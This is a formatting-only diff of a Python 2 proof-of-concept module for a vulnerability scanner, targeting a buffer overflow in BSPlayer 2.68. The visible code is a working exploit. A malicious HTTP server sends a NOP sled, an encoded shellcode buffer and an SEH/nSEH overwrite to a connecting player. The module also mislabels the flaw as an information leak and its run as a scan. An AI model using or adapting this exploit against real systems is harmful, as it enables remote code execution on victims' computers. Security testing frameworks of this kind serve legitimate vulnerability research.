@@ -6,11 +6,12 @@ import sys
 import socket
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'BSPlayer_0001' # 平台漏洞编号，留空
+    vuln_id = 'BSPlayer_0001'  # 平台漏洞编号，留空
     name = 'BSPlayer2.68 缓冲区溢出漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = '2015-03-24'  # 漏洞公布时间
     desc = '''
         BSPlayer suffers from a buffer overflow vulnerability when processing the HTTP response when opening a URL.
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'BSPlayer'  # 漏洞应用名称
     product_version = 'BSPlayer2.68'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '7fbaa4e2-b03e-46e6-856d-ae7a0db41330'
@@ -35,18 +37,20 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             s = socket.socket()         # Create a socket object
             url = urlparse.urlparse(self.target).netloc
             host = socket.gethostbyname(url)   # Ip to listen to.
-            port = urlparse.urlparse(self.target).port if urlparse.urlparse(self.target).port else 80    # Reserve a port for your service.
+            # Reserve a port for your service.
+            port = urlparse.urlparse(self.target).port if urlparse.urlparse(
+                self.target).port else 80
             s.bind((host, port))         # Bind to the port
             s.listen(10)                 # Now wait for client connection.
             c, addr = s.accept()         # Establish connection with client.
             # Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.
             c.recv(1024)
-            #seh and nseh.
-            buf =  ""
+            # seh and nseh.
+            buf = ""
             buf += "\xbb\xe4\xf3\xb8\x70\xda\xc0\xd9\x74\x24\xf4\x58\x31"
             buf += "\xc9\xb1\x33\x31\x58\x12\x83\xc0\x04\x03\xbc\xfd\x5a"
             buf += "\x85\xc0\xea\x12\x66\x38\xeb\x44\xee\xdd\xda\x56\x94"
@@ -71,7 +75,9 @@ class Poc(ABPoc):
             # Partially overwriting the seh record (nulls are ignored).
             seh = "\x3b\x58\x00\x00"
             buflen = len(buf)
-            response = "\x90" *2048 + buf + "\xcc" * (6787 - 2048 - buflen) + jmplong + nseh + seh #+ "\xcc" * 7000
+            response = "\x90" * 2048 + buf + "\xcc" * \
+                (6787 - 2048 - buflen) + jmplong + \
+                nseh + seh  # + "\xcc" * 7000
             c.send(response)
             c.close()
             c, addr = s.accept()        # Establish connection with client.
@@ -81,7 +87,8 @@ class Poc(ABPoc):
             c.close()
             s.close()
             #args['success'] = True
-            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
+            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                target=self.target, name=self.vuln.name))
             return None
 
         except Exception, e:
@@ -89,6 +96,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
